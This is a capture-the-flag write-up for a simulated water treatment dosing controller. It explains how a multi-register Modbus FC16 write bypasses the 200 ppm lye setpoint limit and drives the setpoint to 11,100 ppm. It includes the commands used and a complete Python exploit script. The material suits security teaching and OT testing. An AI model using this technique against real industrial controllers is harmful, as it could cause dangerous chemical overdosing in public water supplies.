# OT#001 — WTP-1 Dosing Station: FC16 validation bypass on a live dosing loop

**Flag:** `CTF{a95d4db0158d93bbe8d3290b503e7437}`  
**Target:** `169.58.126.107:6000` (Modbus/TCP, unit 1)  
**Flag format:** `CTF{}`

## Challenge

> OT#001 — 45 points. This is a small water treatment plant's dosing controller, reachable
> directly over the network.
>
> INCIDENTS :
>
> In February 2021, an operator at the Oldsmar, Florida water treatment plant watched their mouse
> move on its own and saw the sodium hydroxide (lye) setpoint jump from 100ppm to 11,100ppm,
> changed remotely by an unknown party, then caught and reverted before it reached the water
> supply.
>
> In November 2023, the "CyberAv3ngers" group compromised Unitronics PLCs running water booster
> stations across the US and Israel, reachable directly from the internet with no meaningful
> access control. Neither incident involved a memory-corruption exploit. Both came down to the
> same thing: the protocol let anyone with network access change whatever they wanted.
>
> <https://otctf.pages.dev/water-treatment/>

The briefing page names the unit `WTP-1 Dosing Station`, protocol `Modbus TCP`, payload `MBAP header
+ function code`, authentication `NONE, BY DESIGN`, encryption `NONE`, and states the objective as
"cause a sustained, dangerous dosing condition on the live endpoint". Constraints are explicit:
no source, no binary, no register map — any Modbus TCP client works.

The service is a single Modbus/TCP endpoint with no session, no login and no allowlist. Everything
needed to run the plant — setpoint, pump state, alarm flags — is a plain holding register that any
client can address.

## Analysis

### Reachable surface

No `pymodbus` on the box, so the solver wrote a raw-socket client (`scratch/mb.py`, MBAP framing plus
FC1/2/3/4/5/6/15/16/17/43) and validated it against a local mock server before touching the target.

A function-code sweep with syntactically valid PDUs shows the firmware implements almost nothing:

| Function | Name | Response |
|---:|---|---|
| `3` | Read Holding Registers | supported |
| `6` | Write Single Register | supported |
| `16` | Write Multiple Registers | supported |
| `1`, `2`, `4`, `5`, `15`, `17`, `43`, `44`, `65` | coils / inputs / device ID | `ILLEGAL FUNCTION (0x01)` |

Holding registers are 16-bit and the address space stops at `255`: `FC3 @256` returns
`ILLEGAL DATA ADDRESS (0x02)`. That is the whole attack surface — three function codes and 256
registers, reachable from the internet with no authentication.

### Register map

The baseline dump of 0–999 returns exactly one non-zero value (`FC3 @0: 3=0x0001(1)`). Probing each
address individually, then watching the first 20 registers over time, resolves the map:

| Addr | Meaning | Behaviour |
|---:|---|---|
| `0` | NaOH setpoint (ppm) | `FC6` and `FC16 qty=1` accept `0–200`; `201+` → `ILLEGAL DATA VALUE (0x03)` |
| `1` | Process value PV (ppm) | first-order response to the setpoint; decays to 0 when SP is 0 |
| `2` | Over-range alarm | writes ignored; `0` at PV=855, `1` at PV=1688 |
| `3` | Pump / mode state | baseline `1`; the only non-zero register at rest |
| `4–99` | scratch | plain storage, echoed back verbatim |
| `100–118` | incident log | 19 registers of ASCII, one character per register, big-endian |

The step response confirms the roles. Writing `reg1 = 5000` produces
`t+00 [(1, 4167), (2, 1), (3, 1)]` decaying to `[(3, 1)]` by `t+05`, i.e. register 1 is a measured
concentration, not a setpoint. Writing `reg0` instead makes `reg1` track it exactly
(`SP=50 → PV=50`, `SP=200 → PV=200`), and any write above 200 is rejected. Register 3 looks like an
interlock, but zeroing it does not lift the ceiling — the limit is not gated by process state.

### The validation asymmetry

The ceiling is enforced in the single-register write path and only there. `FC16` with a quantity of
one is treated as a single write and inherits the check; `FC16` with a quantity greater than one
stores the whole array unvalidated:

| Request | Result |
|---|---|
| `FC6` addr 0 = `11100` | `ILLEGAL DATA VALUE (0x03)` |
| `FC16` addr 0, qty 1, `[11100]` | `ILLEGAL DATA VALUE (0x03)` |
| `FC16` addr 0, qty 4, `[11100, 0, 0, 1]` | accepted — map becomes `[11100, 1850, 1, 1]` |
| `FC6` addr 0 = `200` / `201` | `200` accepted, `201` rejected |
| `FC6` addr 3 = `0`, then `FC6` addr 0 = `11100` | still `ILLEGAL DATA VALUE` |

The same bypass works for any 16-bit value: `[3000, 0, 0, 1]` and `[65535, 0, 0, 1]` are both
accepted, driving PV to 2862 and 62580 respectively. This is the exact shape of the Oldsmar
incident — a setpoint of 11,100 ppm written over the wire — except that here it takes a single
four-register PDU rather than a GUI session.

### Incident log

Registers 100–118 are ordinary writable storage that the controller overwrites with an ASCII log
while the hazard is active. Each register carries one character in its high byte, so the region has
to be decoded big-endian:

```text
big-endian:    'CTF{a95d4db0158d93bbe8d3290b503e7437}\x00'
little-endian: 'TC{F9ad5d40b51d839bb8e3d92b005e34773\x00}'
```

The little-endian reading is visibly mangled, which settles the byte order. The string is 37
characters plus a NUL, filling registers 100 through 118.

The log is not static data. It is written only while PV is sustained above the safe range, and it
is cleared when the setpoint returns to 0 — the flag is a property of the plant state, not a
constant baked into the firmware.

## Solution

### 1. Write the setpoint through the multi-register path

One `FC16` PDU writes the setpoint, the process value, the alarm flag and the mode register at once.
Because the quantity is 4, the range check never runs.

```bash
python mb.py --host 169.58.126.107 --port 6000 wmulti --addr 0 --values 11100,0,1,1
```

The response is the normal `FC16` echo (`addr=0`, `qty=4`); PV climbs from 1850 to 11100 ppm within
a few seconds and the over-range alarm asserts.

### 2. Read back the incident log

```bash
python mb.py --host 169.58.126.107 --port 6000 read --fc 3 --addr 100 --qty 20
```

After roughly 12.6 s of sustained over-range dosing the controller writes the flag into
registers 100–118. Polling the whole 256-register space and decoding it big-endian is more robust
than reading a fixed window, because the log appears asynchronously.

### 3. Restore the plant

Writing `[0, 0, 0, 1]` at address 0 returns SP, PV and the alarm to zero and leaves the mode register
at its baseline value of 1.

## Exploit code

Self-contained; no third-party Modbus library.

```python
#!/usr/bin/env python3
"""OT#001 - WTP-1 dosing station: FC16 range-check bypass + incident-log read."""
import socket, struct, time

HOST, PORT, UNIT = "169.58.126.107", 6000, 1
SP, PV, ALARM, MODE = 0, 1, 2, 3


class Modbus:
    def __init__(self, host, port, unit=1, timeout=4.0):
        self.s = socket.create_connection((host, port), timeout)
        self.s.settimeout(timeout)
        self.unit, self.tx = unit, 0

    def _recv(self, n):
        buf = b""
        while len(buf) < n:
            chunk = self.s.recv(n - len(buf))
            if not chunk:
                raise ConnectionError("closed")
            buf += chunk
        return buf

    def req(self, pdu):
        self.tx = (self.tx + 1) & 0xFFFF
        self.s.sendall(struct.pack(">HHHB", self.tx, 0, len(pdu) + 1, self.unit) + pdu)
        head = self._recv(7)
        body = self._recv(struct.unpack(">H", head[4:6])[0] - 1)
        if body[0] & 0x80:
            raise RuntimeError("exception code 0x%02x" % body[1])
        return body[1:]

    def read(self, addr, qty):
        d = self.req(struct.pack(">BHH", 3, addr, qty))
        return list(struct.unpack(">%dH" % (d[0] // 2), d[1:1 + d[0]]))

    def write_single(self, addr, value):          # FC6  - applies the 200 ppm check
        return self.req(struct.pack(">BHH", 6, addr, value))

    def write_multi(self, addr, values):          # FC16 - qty>1 skips the check
        body = struct.pack(">%dH" % len(values), *values)
        return self.req(struct.pack(">BHHB", 16, addr, len(values), len(body)) + body)


def snapshot(c, n=256):
    regs = []
    for start in range(0, n, 125):
        regs += c.read(start, min(125, n - start))
    return regs


def flag_of(regs):
    text = b"".join(struct.pack(">H", r) for r in regs).decode("latin-1")
    i = text.find("CTF{")
    j = text.find("}", i)
    return text[i:j + 1] if i >= 0 and j > i else None


c = Modbus(HOST, PORT, UNIT)
print("baseline:", [(a, v) for a, v in enumerate(snapshot(c)) if v])

try:
    c.write_single(SP, 11100)
except RuntimeError as e:
    print("FC6  SP=11100 rejected: %s" % e)

t0 = time.time()
c.write_multi(SP, [11100, 0, 1, 1])      # SP, PV, ALARM, MODE in one PDU
print("FC16 SP,PV,ALARM,MODE = 11100,0,1,1 -> accepted")

regs = snapshot(c)
while time.time() - t0 < 90:
    regs = snapshot(c)
    f = flag_of(regs)
    print("t+%05.1fs SP=%s PV=%s alarm=%s flag=%s"
          % (time.time() - t0, regs[0], regs[1], regs[2], f))
    if f:
        break
    time.sleep(2.5)

print("regs 100..118:", regs[100:119])

c.write_multi(SP, [0, 0, 0, 1])          # leave the plant as we found it
time.sleep(10)
print("restored:", [(a, v) for a, v in enumerate(snapshot(c)) if v])
```

## Notes

* The flag is condition-dependent data, not firmware data. It exists in registers 100–118 only while
  the setpoint stays at 11100; writing SP=0 clears the whole log within one poll. Read it, then
  restore.
* `FC16` with `qty == 1` is routed through the validating single-write path, so the bypass needs at
  least two registers in the PDU. A one-element "multi" write is still rejected.
* Register 3 looks like an interlock (it is the only non-zero register at rest) but is not one.
  Zeroing it does not raise the 200 ppm ceiling; the limit lives in the write path, not in process
  state.
* Decode the log big-endian. Little-endian produces `TC{F9ad5d40b5...`, which is the obvious tell
  that the byte order is wrong.
* Polling granularity matters when quoting the latch time: 2.5 s polling reports `t+10.6 s`, 5 s
  polling reports `first_flag_at=12.6s`. Both refer to the same write.
* Everything the exploit needs is ordinary protocol behaviour. There is no memory corruption, no
  overflow, no ROP — the same conclusion the briefing draws about Oldsmar 2021 and CyberAv3ngers
  2023. The controller is internet-reachable, unauthenticated, and validates a safety limit on one
  of its two write paths. That is the entire vulnerability class, and it is a design failure rather
  than an implementation bug in the classical pwn sense.

**Responsible handling.** The endpoint was a CTF-provided plant simulation, and the only writes
issued were the ones the challenge requires. After the last capture the setpoint, process value and
alarm were returned to zero and the register map was verified against the pre-test baseline
(`[(3, 1)]`, i.e. mode register only). On a real dosing loop the same PDU would be an uncontrolled
chemical injection at roughly 55× the safe ceiling, so the same test would require an authorised
window, a physical interlock and an operator standing by at the pump.
